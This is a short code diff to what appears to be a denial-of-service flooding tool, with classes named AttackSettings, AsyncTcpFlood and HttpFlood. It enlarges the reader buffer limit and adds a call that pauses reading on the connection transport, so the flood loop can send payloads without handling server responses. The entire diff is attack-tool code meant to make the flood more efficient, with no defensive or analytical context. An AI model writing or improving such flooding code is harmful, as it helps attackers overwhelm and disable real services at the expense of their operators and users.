@@ -627,7 +627,7 @@ class AttackSettings:
         tcp_read_timeout_seconds: float = 0.2,
         requests_per_connection: int = 1024,
         high_watermark: int = 1024 << 5,
-        reader_limit: int = 1024,
+        reader_limit: int = 1024 << 4,
     ):
         self.transport = transport
         self.connect_timeout_seconds = connect_timeout_seconds
@@ -749,6 +749,8 @@ class AsyncTcpFlood(HttpFlood):
         rpc = rpc or self._settings.requests_per_connection
         packets_sent, packet_size = 0, len(payload)
         reader, writer = await self.open_connection()
+        if hasattr(writer.transport, "pause_reading"):
+            writer.transport.pause_reading()
         try:
             for _ in range(rpc):
                 await self._send_packet(writer, payload)
